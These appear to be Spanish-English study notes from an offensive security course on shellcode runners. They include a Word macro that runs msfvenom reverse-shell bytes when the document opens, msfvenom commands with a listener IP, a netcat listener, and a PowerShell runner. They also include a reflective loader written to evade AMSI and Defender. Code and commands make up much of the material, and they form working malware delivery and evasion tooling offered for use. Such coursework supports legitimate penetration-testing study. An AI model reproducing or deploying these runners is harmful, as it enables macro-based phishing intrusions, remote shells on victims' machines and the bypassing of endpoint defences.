### Calling Win32 APIs from VBA

🟢 Fase 1: El Enganche (Word y VBA)
La víctima abre el documento .docm y hace clic en "Habilitar contenido".

Word ejecuta automáticamente Document_Open o AutoOpen.

Estas llaman a MyMacro(), que es donde está toda la lógica maliciosa.

🟢 Fase 2: Reserva de Memoria Ejecutable (VirtualAlloc)
vba
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
Aquí ocurre la magia para evadir el DEP (Data Execution Prevention) de Windows:

0: Windows elige la dirección de memoria por ti.

UBound(buf): Calcula dinámicamente el tamaño del shellcode. Si cambias el payload, no tienes que cambiar este número.

&H3000 (MEM_COMMIT | MEM_RESERVE): Le pide al sistema operativo que reserve y confirme un bloque de memoria.

&H40 (PAGE_EXECUTE_READWRITE): Le da permisos a esa memoria para ser Leída, Escrita y Ejecutada (RWX). Normalmente, Windows no permite ejecutar memoria que acabas de escribir (eso es lo que bloquea el DEP), pero al pedirlo explícitamente como RWX, lo permitimos.

La función devuelve un puntero (addr) a esa nueva zona de memoria.

🟢 Fase 3: Copia del Shellcode (RtlMoveMemory)
vba
For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
En VBA, tu payload está guardado en un Array de números (el que generaste con msfvenom).

Este bucle For recorre el array byte por byte.

RtlMoveMemory toma cada byte y lo copia a la dirección de memoria que reservamos en el paso anterior (addr + counter).

Al terminar el bucle, el shellcode completo está sentado en la memoria RAM del proceso de Word, listo para ser ejecutado.

🟢 Fase 4: Ejecución en un Hilo Nuevo (CreateThread)
vba
res = CreateThread(0, 0, addr, 0, 0, 0)
Windows no ejecuta el shellcode solo porque esté en memoria. Hay que decirle que empiece a ejecutarlo.

CreateThread le ordena al sistema operativo: "Crea un nuevo hilo de ejecución dentro del proceso de Word, y empieza a ejecutar el código que está en la dirección addr".

Los demás parámetros están en 0 porque no necesitamos configuraciones especiales (ni atributos de seguridad, ni tamaño de pila personalizado, ni parámetros para el shellcode).

Aquí es donde tu payload cobra vida.

🟢 Fase 5: La Conexión (El Shellcode en acción)
El shellcode que generaste con msfvenom -p windows/shell_reverse_tcp se ejecuta.

Lo primero que hace es crear un Socket TCP y conectarse a la IP y puerto que le indicaste (192.168.234.2:4444).

Como usaste un payload Stageless (sin etapas), no pide nada más. Inmediatamente lanza un proceso cmd.exe en Windows.

Redirige la entrada y salida de esa cmd.exe a través del socket TCP hacia tu Kali.

En Kali: rlwrap nc -lvnp 4444 recibe la conexión y te muestra el prompt de la cmd de Windows.

🟢 Fase 6: El Ciclo de Vida (¿Por qué usamos EXITFUNC=thread?)
Cuando cierras la shell (escribes exit en la cmd de Windows), el shellcode termina.

Como usaste EXITFUNC=thread, solo muere el hilo que creó CreateThread. El proceso de Word sigue abierto y vivo.

Si hubieras usado el EXITFUNC por defecto (process), al cerrar la shell, Word se habría cerrado de golpe, alertando a la víctima.

Desventaja: Si la víctima cierra Word, el hilo muere y pierdes la shell. Para evitarlo, se suele usar un segundo payload (como PowerShell) para migrar a un proceso persistente, o se inyecta en un proceso del sistema.

⚠️ ¿Por qué esto es sigiloso pero peligroso para el atacante?
Ventaja: No hay archivos .exe en el disco. Todo ocurre en la RAM. Los antivirus tradicionales que escanean archivos no ven nada.

Desventaja: Windows Defender moderno y los EDRs detectan inmediatamente la combinación de VirtualAlloc con permisos RWX + CreateThread. Es una firma de comportamiento clásica. Por eso, para un ataque real, se necesitan técnicas de evasión más avanzadas (como cifrar el shellcode, usar llamadas indirectas a APIs, o inyección en procesos remotos).


```
' ==========================================
' 1. DECLARACIONES DE LAS APIs (ARRIBA DEL TODO)
' ==========================================
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

' ==========================================
' 2. LA FUNCIÓN PRINCIPAL
' ==========================================
Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' 🔽 AQUÍ VA TU ARRAY DE MSFVENOM 🔽
    ' Asegúrate de que cada línea termine con un guion bajo _ para continuar
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, _
                139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, _
                49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, _
                ' ... (pega aquí todos los bytes de tu payload) ...
                83, 255, 213)
    
    ' 1. Asignar memoria ejecutable (RWX)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' 2. Copiar el shellcode byte a byte a la memoria asignada
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' 3. Ejecutar el shellcode en un nuevo hilo
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

' ==========================================
' 3. EVENTOS DE WORD (AL FINAL)
' ==========================================
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

# Porting Shellcode Runner to PowerShell

`kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1`

Next
```
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```
We invoked the imported VirtualAlloc call with the same arguments as before. These include a "0" to let the API choose the allocation address, the detected size of the shellcode, and the hexadecimal numbers 0x3000 and 0x40 to set up memory allocation and protections correctly.

We used the .NET Copy method to copy the shellcode, supplying the managed shellcode array, an offset of 0 indicating the start of the buffer, the unmanaged buffer address, and the shellcode size.

Finally, we called CreateThread, supplying the starting address.

If we run this code from PowerShell ISE, we get a reverse shell. Nice.



## "Reflective" (Reflectiva) de un shellcode runner

Este script es una versión "Reflective" (Reflectiva) de un shellcode runner, y representa una técnica de evasión mucho más avanzada que la que hicimos con Add-Type.

Ambos scripts logran exactamente lo mismo (ejecutar shellcode en memoria usando VirtualAlloc, Marshal.Copy y CreateThread), pero la forma en que obtienen las direcciones de las funciones de Windows es completamente distinta.

Aquí te explico la diferencia principal:
1. El método anterior (Add-Type + DllImport)
En el script que hicimos antes, usábamos Add-Type para compilar código C# que contenía declaraciones como:

csharp
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(...);
Cómo funciona: .NET lee el DllImport y, en tiempo de ejecución, busca en kernel32.dll la función VirtualAlloc, la carga y la expone a PowerShell como un método normal.

Problema de evasión: Para que esto funcione, la cadena "DllImport", "VirtualAlloc" y "kernel32.dll" quedan escritas en texto plano en el script. AMSI (Antimalware Scan Interface) de Windows Defender escanea ese texto y bloquea el script al instante porque es una firma clásica de malware.

2. El método nuevo (Reflective Loader)
Este script no usa Add-Type ni DllImport. En su lugar, hace lo siguiente:

LookupFunc:
Esta función usa reflexión de .NET ([AppDomain]::CurrentDomain.GetAssemblies()) para buscar dentro del ensamblado System.dll una clase interna de .NET llamada Microsoft.Win32.UnsafeNativeMethods.
Una vez encontrada, ejecuta métodos internos de .NET llamados GetModuleHandle (que obtiene la dirección base de kernel32.dll) y GetProcAddress (que busca la dirección de memoria exacta de una función como VirtualAlloc dentro de esa DLL).

Ventaja: No necesitas declarar la función con DllImport. Obtienes el puntero de memoria directamente.

getDelegateType:
Una vez que tienes la dirección de memoria de VirtualAlloc (que es solo un número, un puntero), PowerShell no puede llamarlo directamente porque no sabe qué tipo de función es. Esta función usa System.Reflection.Emit para crear dinámicamente un "Delegado" en memoria. Un Delegado es como un puntero a función de C#, que le dice a .NET: "Esta dirección de memoria recibe 4 parámetros y devuelve un puntero".

GetDelegateForFunctionPointer:
Aquí es donde se unen las dos partes. Toma el puntero devuelto por LookupFunc y lo convierte en un Delegado de .NET usando la plantilla creada por getDelegateType. Ahora ya puedes llamar a VirtualAlloc como si fuera una función normal de PowerShell.

WaitForSingleObject:
Al final, usan esta API para pausar el script de PowerShell y evitar que la consola se cierre inmediatamente después de lanzar el shellcode. Así se mantiene la conexión viva.

📊 Comparativa rápida:

| Característica | Add-Type + DllImport | Reflective Loader |
| :--- | :--- | :--- |
| **Compilación** | Compila código C# en tiempo real. | No compila C#. Usa reflexión pura de .NET. |
| **Obtención de APIs** | Mediante `[DllImport]`. | Mediante `GetModuleHandle` + `GetProcAddress`. |
| **Visibilidad de strings** | Muy alto. Las cadenas "kernel32.dll" y "VirtualAlloc" quedan en texto plano. | Bajo. Las APIs se pasan como argumentos de texto, pero no se declaran. |
| **Evasión de AMSI** | Muy pobre. AMSI detecta `DllImport` y `VirtualAlloc` al instante. | Mejor. Evita la firma de `DllImport`. |
| **Complejidad** | Baja. Fácil de entender y escribir. | Alta. Requiere entender reflexión, delegados y punteros en .NET. |


⚠️ ¿Por qué se usa esto en ciberseguridad ofensiva?
El objetivo de este script es evadir la detección basada en firmas. Al eliminar Add-Type y DllImport, el script ya no contiene las palabras clave que Windows Defender busca para bloquear scripts maliciosos. Es una técnica clásica de "Living off the Land" (LotL) y evasión de AMSI.

¿Funciona del laboratorio?
Depende de la versión de Windows Defender. Aunque este script evade la detección estática (de texto), Windows Defender moderno también tiene detección de comportamiento. Si ve que un proceso de PowerShell llama a VirtualAlloc con permisos RWX y luego a CreateThread, te bloqueará igual, aunque el script no contenga las palabras prohibidas.

Conclusión: Este script es un paso más en la escalera de la evasión. Para que funcione en el laboratorio, necesitas que Windows Defender esté totalmente desactivado (o hayas añadido exclusiones para powershell.exe y powershell_ise.exe). Si quieres probarlo, asegúrate de reemplazar el $buf completo

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```




1. El Problema: Add-Type es ruidoso
El texto empieza recordando que antes usábamos Add-Type y DllImport para importar funciones. Pero eso genera compilación en disco. La alternativa es usar Dynamic Lookup (Búsqueda Dinámica), que es lo que hacen los lenguajes de bajo nivel como C.

2. La Solución: Reflexión en .NET (UnsafeNativeMethods)
En lugar de compilar código nuevo, el texto propone abusar de código que ya está cargado en memoria.

Windows tiene una clase interna dentro de System.dll llamada Microsoft.Win32.UnsafeNativeMethods. Esta clase ya contiene los métodos GetModuleHandle y GetProcAddress, que son las funciones de Windows que nos permiten encontrar otras funciones.

El problema es que son métodos privados/internos de .NET. No podemos llamarlos directamente. Ahí entra la Reflexión (Reflection).

3. El Proceso Paso a Paso
Paso A: Encontrar el ensamblado correcto
El script busca entre todos los ensamblados cargados ([AppDomain]::CurrentDomain.GetAssemblies()) y filtra para encontrar System.dll. Luego, obtiene una referencia a la clase UnsafeNativeMethods usando .GetType().

Paso B: Resolver GetModuleHandle
Usa .GetMethod('GetModuleHandle') para obtener una referencia al método interno. Luego lo invoca con .Invoke($null, @("user32.dll")).

Esto devuelve la dirección base de user32.dll en la memoria. El texto verifica esto usando Process Explorer para ver que la dirección coincide con la real.

Paso C: Resolver GetProcAddress (El error "Ambiguous match")
Aquí hay un detalle técnico importante. Al intentar hacer .GetMethod('GetProcAddress'), da error porque hay múltiples versiones de esa función en la clase.

Solución: Usar .GetMethods() (plural) y filtrar con un bucle ForEach-Object para quedarse solo con las que se llamen "GetProcAddress". Se queda con la primera ($tmp[0]).

Paso D: Encontrar una función específica
Ahora que tienen GetModuleHandle y GetProcAddress, los combinan:

Obtienen la dirección de user32.dll con GetModuleHandle.

Le pasan esa dirección a GetProcAddress junto con el nombre de la función que buscan ("MessageBoxA").

Resultado: Obtienen la dirección de memoria exacta de MessageBoxA (un número decimal que parece basura, pero es la dirección real).

Paso E: Crear la función LookupFunc
Para no repetir todo ese código cada vez, lo meten en una función llamada LookupFunc. Ahora, cada vez que necesiten la dirección de cualquier función de Windows (como VirtualAlloc o CreateThread), solo tienen que llamar a LookupFunc kernel32.dll VirtualAlloc.

💡 ¿Por qué esto es importante para tu Shellcode Runner?
Este texto es la base teórica de lo que vimos en el script "Reflective Loader" que mostramos antes.

Antes: Usabas Add-Type para declarar VirtualAlloc y CreateThread. Esto escribía en disco y AMSI te detectaba.

Ahora: Usas LookupFunc para obtener las direcciones de VirtualAlloc y CreateThread en memoria. No hay compilación, no hay escritura en disco, y el script pasa mucho más desapercibido para Windows Defender.

El siguiente paso (que menciona el final del texto) es usar esos punteros de memoria que encontraste y convertirlos en "Delegados" (usando GetDelegateType) para poder llamarlos como si fueran funciones normales de PowerShell.

En resumen: Este texto te enseña a construir tu propio "buscador de funciones de Windows" usando solo lo que ya está en memoria, evadiendo así la detección estática de antivirus.

Exercises
Go through the PowerShell code in this section and dump the wanted methods to disclose the location of GetModuleHandle and GetProcAddress and perform a lookup of a different Win32 API.
What happens if we use the second entry in the $tmp array?

 Ejercicio 1: Dump de métodos, localizar GetModuleHandle/GetProcAddress y buscar una API diferente
El objetivo es replicar el proceso de reflexión para encontrar las direcciones de memoria de las funciones, pero en lugar de buscar MessageBoxA en user32.dll, buscaremos VirtualAlloc en kernel32.dll.

Copia y pega esto en tu PowerShell ISE (preferiblemente de 32 bits si sigues usando shellcode de 32 bits):
```
PS C:\Users\administrator> $Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
PS C:\Users\administrator> $systemdll = $Assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
PS C:\Users\administrator> $unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
PS C:\Users\administrator> # Dump
PS C:\Users\administrator> $unsafeObj.GetMethods() | Where-Object { $_.Name -eq "GetModuleHandle" -or $_.Name -eq "GetProcAddress" } | Select-Object Name, ReturnType, IsStatic, IsPublic

Name            ReturnType    IsStatic IsPublic
----            ----------    -------- --------
GetModuleHandle System.IntPtr     True     True
GetProcAddress  System.IntPtr     True     True
GetProcAddress  System.IntPtr     True     True


PS C:\Users\administrator> $GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
PS C:\Users\administrator> $GetProcAddressArr = @()
PS C:\Users\administrator> $unsafeObj.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $GetProcAddressArr += $_ } }
PS C:\Users\administrator> $GetProcAddress = $GetProcAddressArr[0] # Using the first one as recommended
PS C:\Users\administrator>
PS C:\Users\administrator> $kernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
PS C:\Users\administrator> $VirtualAllocAddr = $GetProcAddress.Invoke($null, @($kernel32, "VirtualAlloc"))
PS C:\Users\administrator> Write-Output "Base address of kernel32.dll: 0x$($kernel32.ToString('X'))"
Base address of kernel32.dll: 0x7FFCE6630000
PS C:\Users\administrator> Write-Output "Address of VirtualAlloc: 0x$($VirtualAllocAddr.ToString('X'))"
Address of VirtualAlloc: 0x7FFCE6648840
```

¿Qué hace esto?

Utiliza la reflexión de .NET para acceder a métodos que normalmente son privados o internos (UnsafeNativeMethods).

Obtiene la dirección base de kernel32.dll en la memoria del proceso actual.

Usa esa dirección base junto con el nombre de la función "VirtualAlloc" para obtener la dirección exacta de memoria donde vive esa función en tu sistema.

Verás que devuelve un número decimal (que al convertirlo a hexadecimal, empieza con 0x7...), lo que confirma que la resolución fue exitosa.

❓ Ejercicio 2: ¿Qué pasa si usamos la segunda entrada en el array $tmp?
Si cambias $GetProcAddress = $tmp[0] por $GetProcAddress = $tmp[1], el script fallará o devolverá un valor nulo (0) cuando intentes invocarlo con un nombre de función (como "VirtualAlloc").

¿Por qué ocurre esto?
El error "Ambiguous match found" que vimos en el texto ocurre porque en C/C++ la función GetProcAddress tiene dos sobrecargas (overloads) distintas en la API de Windows:

GetProcAddress(HMODULE hModule, LPCSTR lpProcName): Recibe el nombre de la función como una cadena de texto (String).

GetProcAddress(HMODULE hModule, WORD Ordinal): Recibe el número de orden (Ordinal) de la función como un entero (IntPtr/Integer).

En .NET, cuando se crean los wrappers para estas APIs, se generan dos métodos distintos con el mismo nombre pero diferentes firmas. El array $tmp contiene ambos.

$tmp[0] es el método que acepta un String (por eso funciona pasarle "VirtualAlloc").

$tmp[1] es el método que acepta un IntPtr (un número ordinal).

Si usas el segundo método y le pasas una cadena de texto como "VirtualAlloc", .NET lanzará un error de tipo (Type mismatch) o simplemente fallará porque espera un número entero, no una cadena.

Conclusión: Siempre debes usar $tmp[0] a menos que quieras resolver funciones por su número ordinal en lugar de por su nombre.

## DelegateType Reflection
El siguiente texto es la segunda pieza del rompecabezas para crear un shellcode runner reflectivo (que no toca el disco).

Si en el texto anterior aprendimos a encontrar la dirección de memoria de una función de Windows (como MessageBoxA o VirtualAlloc) usando reflexión, ahora nos enfrentamos al siguiente problema: sabemos dónde está, pero no sabemos cómo llamarla.

En C#, para llamar a una función de una DLL nativa se usa la palabra clave delegate (delegado), que básicamente le dice a .NET: "Esta dirección de memoria recibe estos argumentos y devuelve este tipo de dato". Pero PowerShell no tiene la palabra clave delegate.

Para solucionarlo, este texto explica cómo construir un tipo de dato "Delegado" en memoria desde cero usando System.Reflection.Emit. Es un proceso largo y manual, pero es 100% en memoria (no escribe nada en disco).

🧱 Fase 1: Construir la "Fábrica" en Memoria (Listings 80-82)
Imagina que vas a construir un coche. Necesitas una fábrica (Assembly), una línea de ensamblaje (Module) y un molde (Type).

New-Object System.Reflection.AssemblyName('ReflectedDelegate'): Le das un nombre a tu fábrica ficticia.

DefineDynamicAssembly(..., AssemblyBuilderAccess::Run): Creas la fábrica, pero le dices que solo viva en memoria (Run), que no se guarde en disco.

DefineDynamicModule('InMemoryModule', $false): Dentro de la fábrica, creas un módulo (la línea de ensamblaje). El $false significa que no necesitas guardar archivos de símbolos (debug).

DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]): Aquí creas el "molde". Le pones de nombre MyDelegateType. Lo importante es que hereda de [System.MulticastDelegate], que es la clase base de .NET para todos los delegados.

⚙️ Fase 2: Definir el "Contrato" (Los Argumentos) (Listings 84-85)
Ahora que tienes el molde, necesitas decirle qué tipo de funciones puede representar. Para MessageBoxA, necesitas definir un constructor (la firma de la función).

DefineConstructor(...):

'RTSpecialName, HideBySig, Public': Son los atributos obligatorios para un constructor de delegado.

[System.Reflection.CallingConventions]::Standard: La convención de llamada estándar de Windows (cómo se pasan los argumentos por la pila).

@([IntPtr], [String], [String], [int]): Aquí está la clave. Le pasas un array con los tipos de datos exactos que recibe MessageBoxA (un puntero, dos strings y un entero).

SetImplementationFlags('Runtime, Managed'): Le dices a .NET que este código se ejecutará en tiempo de ejecución (Runtime) y que es código administrado (Managed).

📞 Fase 3: Definir el "Método de Invocación" (Listings 86-87)
El constructor definió los argumentos de entrada, pero falta definir qué devuelve la función y cómo se llama.

DefineMethod('Invoke', ...):

'Public, HideBySig, NewSlot, Virtual': Atributos del método (público, virtual, etc.).

[int]: El tipo de dato que devuelve MessageBoxA (un entero).

@([IntPtr], [String], [String], [int]): Los mismos argumentos de entrada que definimos en el constructor.

SetImplementationFlags('Runtime, Managed'): Igual que antes, indicando que es código en tiempo de ejecución.

$MyDelegateType = $MyTypeBuilder.CreateType(): ¡La fábrica termina de construir el molde! Ahora tienes un tipo de dato llamado MyDelegateType listo para usarse.

🔗 Fase 4: El Enlace Final (Listing 88)
Ahora que tienes la dirección de memoria ($MessageBoxA) y el molde del delegado ($MyDelegateType), los unes:

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType): Esta función de .NET toma la dirección de memoria y el tipo de delegado, y crea un objeto que puedes llamar como si fuera una función normal de PowerShell ($MyFunction).

$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0): ¡Ejecutas la API de Windows! Le pasas los argumentos exactos que definiste en el molde (0, "Hello World", "This is My MessageBox", 0) y MessageBoxA se ejecuta sin haber usado Add-Type ni haber escrito nada en disco.

💡 ¿Por qué esto es tan importante para el Shellcode Runner?
Este es el "pegamento" que faltaba. En el script final (que vimos en el archivo anterior), en lugar de definir un delegado para MessageBoxA, definimos delegados para VirtualAlloc, RtlMoveMemory y CreateThread.

Para VirtualAlloc, el molde sería: @([IntPtr], [UInt32], [UInt32], [UInt32]) y devuelve [IntPtr].

Para CreateThread, el molde sería: @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) y devuelve [IntPtr].

Al usar GetDelegateForFunctionPointer con estos moldes, PowerShell puede llamar a las APIs de Windows como si fueran funciones nativas de .NET, pero todo ocurre en la memoria RAM del proceso de PowerShell.

En resumen: Este texto te enseña a falsificar los tipos de datos de funciones de Windows en memoria para poder ejecutarlas sin que Windows Defender te detecte el DllImport o la escritura de archivos temporales de Add-Type. Es la técnica de evasión definitiva para scripts de PowerShell.
```
# ==========================================================
# 1. FUNCIÓN LOOKUP: Encuentra la dirección de cualquier API
# ==========================================================
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# ==========================================================
# 2. RESOLVER LA DIRECCIÓN DE MessageBoxA EN user32.dll
# ==========================================================
$MessageBoxA = LookupFunc user32.dll MessageBoxA

# ==========================================================
# 3. CONSTRUIR EL DELEGADO EN MEMORIA (Sin Add-Type)
# ==========================================================
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# --- Definir el constructor (los argumentos de entrada) ---
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([IntPtr], [String], [String], [int]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

# --- Definir el método Invoke (el tipo de retorno) ---
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
  'Public, HideBySig, NewSlot, Virtual', 
    [int], 
      @([IntPtr], [String], [String], [int]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# --- Crear el tipo de dato (el "molde") ---
$MyDelegateType = $MyTypeBuilder.CreateType()

# ==========================================================
# 4. ENLAZAR DIRECCIÓN + DELEGADO Y EJECUTAR
# ==========================================================
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```

⚠️ Notas importantes:
Si ejecutas el script dos veces en la misma sesión de ISE, te dará error porque el tipo MyDelegateType ya existe. Cierra y vuelve a abrir ISE antes de cada prueba.

Verifica tu arquitectura: Si estás en un ISE de 64 bits, las direcciones de memoria serán de 64 bits. Si estás en uno de 32 bits, de 32 bits. Ambos funcionan, pero asegúrate de usar el ISE correcto (en la captura del texto original usaban el de 32 bits: C:\Windows\SysWOW64\WindowsPowerShell\v1.0).

Si Windows Defender te bloquea el script, es porque AMSI está escaneando la cadena "MessageBoxA" o "GetProcAddress". Para tus pruebas de laboratorio, añade una exclusión o desactiva la protección en tiempo real.

Exercises
Use the PowerShell code to call MessageBoxA using reflection instead of Add-Type.
Use Process Monitor to verify that no C# source code is written to disk or compiled.
The Win32 WinExec API can be used to launch applications. Modify the existing code to resolve and call WinExec and open Notepad. Use resources such as MSDN and P/Invoke to understand the arguments for the function and the associated data types.

Descarga Process Monitor de la página de Microsoft Sysinternals y ejecútalo como Administrador.

En la barra de herramientas, haz clic en el icono de embudo (Filter) y añade estos filtros:

Process Name is powershell_ise.exe (o powershell.exe).

Operation is CreateFile (o Process Create).

Deja ProcMon corriendo.

Ejecuta el script de PowerShell del Ejercicio 1.

Verás que aparece el MessageBox, pero en ProcMon NO deberías ver ninguna operación de escritura de archivos .cs ni la ejecución del compilador csc.exe.

Comparación: Si ejecutas un script con Add-Type, verás en ProcMon que se crea un archivo .cs en %TEMP% y se lanza csc.exe. Con la técnica de reflexión, eso desaparece por completo. Todo ocurre en memoria.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5d1c2642-a62d-4a03-918d-f968092500b7" />

 Ejercicio 3: Resolver y llamar a WinExec para abrir Notepad
Para este ejercicio, necesitamos entender la firma de WinExec:

Según MSDN y P/Invoke:
```
UINT WinExec(
  LPCSTR lpCmdLine,  // String (Puntero a cadena de texto)
  UINT   uCmdShow    // UInt32 (Entero sin signo)
);
```

lpCmdLine: Es una cadena de texto normal, en .NET se traduce como [String].

uCmdShow: Es un entero sin signo de 32 bits, en .NET se traduce como [UInt32].

Retorno: Devuelve un UINT ([UInt32]).

El valor 1 para uCmdShow equivale a SW_SHOWNORMAL (abrir la ventana en su tamaño y posición normales).

Aquí tienes el código completo. Fíjate en cómo cambiamos los tipos de datos en el DefineConstructor y DefineMethod para que coincidan con WinExec:
```
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# 1. Resolver la dirección de WinExec en kernel32.dll
$WinExec = LookupFunc kernel32.dll WinExec

# 2. Construir el Delegado en memoria para WinExec
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateTypeWinExec', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# --- Constructor: Recibe [String] lpCmdLine y [UInt32] uCmdShow ---
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([String], [UInt32])) 
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

# --- Método Invoke: Devuelve [UInt32] ---
